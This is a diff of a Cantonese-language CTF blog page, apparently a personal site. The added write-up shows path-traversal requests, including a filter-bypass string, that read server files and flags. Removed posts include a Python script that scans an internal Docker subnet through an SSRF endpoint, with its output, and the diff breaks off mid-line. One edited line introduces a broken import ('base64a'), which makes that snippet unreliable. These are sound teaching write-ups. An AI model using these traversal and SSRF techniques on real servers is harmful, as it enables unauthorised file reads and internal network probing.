+    <a href="/2018/04/22/TimisoaraCTF2018-BookDir1-2/" class="article-date">
+  <time datetime="2018-04-22T13:49:36.000Z" itemprop="datePublished">2018-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/22/TimisoaraCTF2018-BookDir1-2/">TimisoaraCTF2018-BookDir1-2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="http://89.38.210.129:8012" target="_blank" rel="noopener">http://89.38.210.129:8012</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="BookDir2"><a href="#BookDir2" class="headerlink" title="BookDir2"></a>BookDir2</h3><p>第一步入去睇source見到有個js file, 似乎係用黎裝住client side既core logic.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bookTemplate = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;div class="col-lg-4 col-sm-6 text-center mb-4"&gt;</span></span><br><span class="line"><span class="string">  &lt;h3&gt;%NAME%&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;%MESSAGE%&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bookMessages = [</span><br><span class="line">    <span class="string">'A great book indeed!'</span>,</span><br><span class="line">    <span class="string">'Best content you can get out there.'</span>,</span><br><span class="line">    <span class="string">'Best-seller &amp; #1 10 times in a row.'</span>,</span><br><span class="line">    <span class="string">'Featured and recommended by us.'</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'booklist.php'</span>,</span><br><span class="line">    dataType: <span class="string">'json'</span>,</span><br><span class="line">    type: <span class="string">'GET'</span>,</span><br><span class="line">    headers: &#123;<span class="string">'X-Dir'</span>: <span class="string">'.'</span>&#125;,</span><br><span class="line">    success: <span class="function">(<span class="params">books</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> container = $(<span class="string">'#books'</span>);</span><br><span class="line">        books.forEach(<span class="function"><span class="params">book</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// let message = bookMessages[Math.floor(Math.random() * bookMessages.length)];</span></span><br><span class="line">            $.getJSON(<span class="string">'booklist.php?f='</span> + book.name, message =&gt; &#123;</span><br><span class="line">                container.append(bookTemplate.replace(<span class="regexp">/%NAME%/g</span>, book.name).replace(<span class="regexp">/%MESSAGE%/g</span>, message));</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>呢段script就咁睇似乎 booklist.php 係用黎拎book list既 , 咁佢需要既野正係得 X-Dir , 或者個X-Dir係用黎控制係邊個directory拎野?<br>正常request過去睇下咩黎架先<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="attr">"name"</span>:<span class="string">"Beloved"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Catch-22"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Lolita"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Nineteen Eighty-Four"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"The Catcher in the Rye"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"The Grapes of Wrath"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"The Great Gatsby"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"The Sound and the Fury"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Ulysses"</span>&#125;]</span><br></pre></td></tr></table></figure></p>
+<p>咁試下改佢做 ../ 再request睇下先<br>果然拎番黎既結果唔同左<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="attr">"name"</span>:<span class="string">"4o4_fl4g_n0t_f0und.php"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"booklist.php"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"books.js"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"css"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"index.html"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"list"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"vendor"</span>&#125;]</span><br></pre></td></tr></table></figure></p>
+<p>咁而家要做既野應該就係諗方法點讀個 4o4_fl4g_n0t_f0und.php<br>睇番條javascript, 原來booklist.php仲可以收個f variable, 咁就睇應該係個filename<br>直接試下入f=4o4_fl4g_n0t_f0und.php先 , 不過發現原來係唔work既<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">false</span><br></pre></td></tr></table></figure></p>
+<p>咁試下入番正常書名先 f=Beloved<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\&quot;124 was spiteful. Full of baby&apos;s venom. The women in the house knew it and so did the children.\&quot;\n&quot;</span><br></pre></td></tr></table></figure></p>
+<p>發現又回到野喎 , 咁可能個X-Dir應該正係用黎list directory , 真正讀file果下應該set死左係list個folder到<br>咁既話應該可以 f=../4o4_fl4g_n0t_f0und.php 黎讀番上一層個file , 不過發現都係fail左<br>有機會係套source直接將../ replace左之類 , 咁唯有試下 …/./4o4_fl4g_n0t_f0und.php 啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;?php\n\/\/ timctf&#123;f0und_f1rst_p4rt___wh4t_n3xt&#125;\n\n\/\/ Can you get the second part? :^)\n&quot;</span><br></pre></td></tr></table></figure></p>
+<h3 id="BookDir"><a href="#BookDir" class="headerlink" title="BookDir"></a>BookDir</h3><p>承上題我地可以任意讀file之後 , 咁就順手讀埋 booklist.php睇下有冇flag啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;?php\n\n$headers = getallheaders();\n\nfunction waf($str) &#123;\n    return str_replace(&apos;..\/&apos;, &apos;&apos;, $str);\n&#125;\n\nif (isset($_GET[&apos;f&apos;])) &#123;\n    ini_set(&apos;open_basedir&apos;, &apos;\/var\/www\/site\/&apos;);\n    \/\/ ^ I wonder why that is.. ?\n\n    echo json_encode(file_get_contents(&apos;list\/&apos; . waf($_GET[&apos;f&apos;])));\n&#125; else &#123;\n    ini_set(&apos;open_basedir&apos;, &apos;\/var\/www\/site\/books\/&apos;);\n\n    $dir = &apos;.&apos;;\n    if (isset($headers[&apos;X-Dir&apos;])) &#123;\n        $dir = $headers[&apos;X-Dir&apos;]; \/\/ waf()? might be too easy for the first stage :^)\n\n        \/\/ artificial hack to check for \/ as last char after replacement\n        if ($dir[strlen($dir) - 1] !== &apos;\/&apos;) &#123;\n            $dir = &apos;.&apos;;\n        &#125;\n    &#125;\n\n    $files = [];\n    foreach (array_diff(scandir(&apos;list\/&apos; . $dir), [&apos;..&apos;, &apos;.&apos;]) as $file) &#123;\n        $files[] = [&apos;name&apos; =&gt; $file];\n    &#125;\n\n    echo json_encode($files);\n&#125;\n&quot;</span><br></pre></td></tr></table></figure></p>
+<p>結果係無既 , 咁順手試埋再上一層個.htaccess先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;Files .htaccess&gt;\n  Order allow,deny\n  Deny from all\n&lt;\/Files&gt;\n\n&lt;Files w0w_y0u_g0t_m3___.php&gt;\n  Order allow,deny\n  Deny from all\n&lt;\/Files&gt;\n\nRewriteEngine On\nRewriteRule ^(?:books\/list)\\b.* \/403.php\n&quot;</span><br></pre></td></tr></table></figure></p>
+<p>發現左root directory 有個file叫w0w_y0u_g0t<em>m3__</em>.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;?php\n\n\/\/ timctf&#123;b0Ok5_4r3_4m4z1ng&#125;\necho &apos;c0ngr4ts!&apos;;\n&quot;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>BookDir: timctf{b0Ok5_4r3_4m4z1ng}<br>BookDir2: timctf{f0und_f1rst_p4rt___wh4t_n3xt}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-BookDir1-2/" data-id="cjgaye6lw000efkw5w053j0er" class="article-share-link">Compartir</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-NeverLanCTF2018-Turtles-All-The-Way-Down" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -85,7 +369,7 @@
       
         <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><h3 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h3><p><a href="turtle">turtle</a></p>
 <h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>就咁睇似係base64 encoded<br><img src="1.png" alt=""></p>
-<p>所以第一步就解左佢先啦<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = open(<span class="string">"C:/Users/Admin/Desktop/turtle"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"C:/Users/Admin/Desktop/turtle.dec"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(base64.b64decode(enc))</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure></p>
+<p>所以第一步就解左佢先啦<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64a</span><br><span class="line">enc = open(<span class="string">"C:/Users/Admin/Desktop/turtle"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"C:/Users/Admin/Desktop/turtle.dec"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(base64.b64decode(enc))</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure></p>
 <p>解完出黎係堆咁既野<br><img src="2.png" alt=""></p>
 <p>但係我要既野正係中間果堆hex, 咁用sublime text處理下先啦<br>第一步 , 唔要頭果堆hex address<br><img src="3.png" alt=""></p>
 <p>然後唔要埋尾果堆<br><img src="4.png" alt=""></p>
@@ -98,7 +382,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/03/16/NeverLanCTF2018-Turtles-All-The-Way-Down/" data-id="cjetvs9hm0009dgw57e7mdimd" class="article-share-link">Share</a>
+      <a data-url="https://catpawn.github.io/2018/03/16/NeverLanCTF2018-Turtles-All-The-Way-Down/" data-id="cjgaye6lu000cfkw593bgoi11" class="article-share-link">Compartir</a>
       
       
     </footer>
@@ -138,7 +422,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/03/16/PragyanCTF2018-Scientists-research/" data-id="cjetvs9hl0008dgw5ydadaof3" class="article-share-link">Share</a>
+      <a data-url="https://catpawn.github.io/2018/03/16/PragyanCTF2018-Scientists-research/" data-id="cjgaye6lq0009fkw51zlokrmy" class="article-share-link">Compartir</a>
       
       
     </footer>
@@ -181,319 +465,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/01/01/Bamboofox2017-suck-file/" data-id="cjetvs9hh0004dgw58qzphvwg" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-tiny-docker-SSRF" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/01/tiny-docker-SSRF/" class="article-date">
-  <time datetime="2018-01-01T10:01:02.000Z" itemprop="datePublished">2018-01-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/01/tiny-docker-SSRF/">BamboofoxCTF2017-tiny-docker-SSRF</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="http://bamboofox.cs.nctu.edu.tw:53323/" target="_blank" rel="noopener">http://bamboofox.cs.nctu.edu.tw:53323/</a></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="Hint1"><a href="#Hint1" class="headerlink" title="Hint1"></a>Hint1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">There is a lot of server/docker in a company.</span><br><span class="line"></span><br><span class="line">So you may need a little brute-force.</span><br><span class="line"></span><br><span class="line">You will get the flag between 1 to 500</span><br></pre></td></tr></table></figure>
-<h3 id="Hint2"><a href="#Hint2" class="headerlink" title="Hint2"></a>Hint2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mostly, container share a bridge...</span><br></pre></td></tr></table></figure>
-<p>呢2個hint想表達既似乎係有另一部裝住flag 既docker server係同題目係同一個subnet.<br>而係需要少少brute force既 , 咁應該係ip啦<br>如果係internal network既 , 咁應該係由172.17開頭<br>即刻寫條script brute brute佢先</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">501</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r = requests.post(<span class="string">"http://bamboofox.cs.nctu.edu.tw:53323/redirect.php"</span>,data=&#123;<span class="string">'url'</span>:<span class="string">'172.17.0.'</span> + str(i)&#125;,timeout=<span class="number">0.5</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Warning"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"[+] !!!! "</span> + <span class="string">'172.17.0.'</span> + str(i)</span><br><span class="line">			output += <span class="string">"==============172.17.0."</span> + str(i) + <span class="string">"====================="</span></span><br><span class="line">			output += r.text</span><br><span class="line">			output += <span class="string">"============================================================\r\n"</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"[-] Fail : "</span> + <span class="string">'172.17.0.'</span> + str(i)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"[-]"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"C:/Users/admin/Desktop/out.log"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(output.encode(<span class="string">'ascii'</span>, <span class="string">'ignore'</span>).decode(<span class="string">'ascii'</span>))</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>
-<p>最後係 172.17.0.80 搵到條flag</p>
-<h3 id="out-log"><a href="#out-log" class="headerlink" title="out.log"></a>out.log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">==============172.17.0.79=====================&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Docker-SSRF&lt;/title&gt;</span><br><span class="line">        &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;center&quot;&gt;</span><br><span class="line">            &lt;form action=&quot;./redirect.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                &lt;h2&gt;</span><br><span class="line">                    Redirect to: &lt;input type=&quot;text&quot; name=&quot;url&quot;&gt;</span><br><span class="line">                    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">                &lt;/h2&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;img src=&quot;https://res.cloudinary.com/blog-mornati-net/image/upload/v1472668207/sz9sfwiji9foh0cv1v5p.png&quot; style=&quot;width: 60%;&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">============================================================</span><br><span class="line">==============172.17.0.80=====================&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Flag&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.bk &#123;</span><br><span class="line">    background-color: aliceblue;</span><br><span class="line">&#125;</span><br><span class="line">.block &#123;</span><br><span class="line">    margin: auto;</span><br><span class="line">    width: 50%;</span><br><span class="line">    padding: 20px;</span><br><span class="line">    text-align: center;</span><br><span class="line">    margin-top: 10%;</span><br><span class="line">    border: solid 2px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body class=&quot;bk&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;block&quot;&gt;</span><br><span class="line">            &lt;h2&gt;BAMBOOFOX&#123;5srF1n0ocK3r&#125;&lt;/h2&gt;</span><br><span class="line">            &lt;h3&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection&quot;&gt;Server-Side Request Forgery!!&lt;/a&gt;&lt;/h3&gt;</span><br><span class="line">            &lt;img src=&quot;https://d3eaqdewfg2crq.cloudfront.net/wp-content/uploads/2013/08/image2-1024x425.png&quot; style=&quot;width: 100%;&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure>
-<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>BAMBOOFOX{5srF1n0ocK3r}</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/01/01/tiny-docker-SSRF/" data-id="cjetvs9hn000bdgw55t6v93u0" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Bamboofox2017-tiny-git" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/01/Bamboofox2017-tiny-git/" class="article-date">
-  <time datetime="2018-01-01T09:32:59.000Z" itemprop="datePublished">2018-01-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/01/Bamboofox2017-tiny-git/">Bamboofox2017-tiny-git</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="http://bamboofox.cs.nctu.edu.tw:53838" target="_blank" rel="noopener">http://bamboofox.cs.nctu.edu.tw:53838</a></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>見佢個名叫 tiny git , 咁就更係即刻用 gitHack 試下佢先啦<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://bamboofox.cs.nctu.edu.tw:53838</span><br></pre></td></tr></table></figure></p>
-<p><img src="img1.png" alt=""></p>
-<p>之後入番個directory睇log<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure></p>
-<p>之後就會睇到條flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/01/01/Bamboofox2017-tiny-git/" data-id="cjetvs9hk0007dgw5tj1an5sh" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Bamboofox2017-net-packet" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/01/Bamboofox2017-net-packet/" class="article-date">
-  <time datetime="2018-01-01T09:24:23.000Z" itemprop="datePublished">2018-01-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/01/Bamboofox2017-net-packet/">Bamboofox2017-net-packet</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="log-packet">log-packet</a></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>睇番個file header , 原來係pcap file , 所以可以直接用wireshark開</p>
-<p>第一時間當然search下有冇flag先啦 , 點知又真係有!<br><img src="img1.png" alt=""></p>
-<p>睇番個Source係由 192.168.2.2 send 去 192.168.2.4<br>咁就當然sort by Source睇下仲有冇其他野啦~<br>最後搵到 3 個係由 192.168.2.2 send 去 192.168.2.4既packet<br><img src="img2.png" alt=""></p>
-<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>BAMBOOFOX{NetL0g}</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/01/01/Bamboofox2017-net-packet/" data-id="cjetvs9gp0002dgw5tc7bga4h" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Bamboofox2017-little-asm-revenge" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/01/Bamboofox2017-little-asm-revenge/" class="article-date">
-  <time datetime="2018-01-01T09:12:48.000Z" itemprop="datePublished">2018-01-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/01/Bamboofox2017-little-asm-revenge/">Bamboofox2017-little-asm-revenge</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="little-asm-revenge">little-asm-revenge</a></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>扔入ida睇下個main咩料先</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@9</span></span><br><span class="line">  __int64 v4; <span class="comment">// rsi@13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+0h] [bp-E0h]@1</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [sp+4h] [bp-DCh]@4</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [sp+8h] [bp-D8h]@7</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+Ch] [bp-D4h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">40</span>]; <span class="comment">// [sp+10h] [bp-D0h]@4</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">8</span>]; <span class="comment">// [sp+B0h] [bp-30h]@1</span></span><br><span class="line">  __int64 v11; <span class="comment">// [sp+B8h] [bp-28h]@1</span></span><br><span class="line">  __int64 v12; <span class="comment">// [sp+C0h] [bp-20h]@1</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+C8h] [bp-18h]@1</span></span><br><span class="line">  __int64 v14; <span class="comment">// [sp+D0h] [bp-10h]@1</span></span><br><span class="line">  __int64 v15; <span class="comment">// [sp+D8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v15 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input magic string:"</span>);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0L</span>L;</span><br><span class="line">  v11 = <span class="number">0L</span>L;</span><br><span class="line">  v12 = <span class="number">0L</span>L;</span><br><span class="line">  v13 = <span class="number">0L</span>L;</span><br><span class="line">  v14 = <span class="number">0L</span>L;</span><br><span class="line">  _isoc99_scanf(<span class="string">"%38s"</span>, s);</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt; v8; ++i )</span><br><span class="line">    s[i] ^= sub_7F4(i);</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v8; ++j )</span><br><span class="line">    v9[j] = sub_7B0((<span class="keyword">unsigned</span> <span class="keyword">int</span>)s[j]);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v8; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v9[k] != dword_201040[k] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span 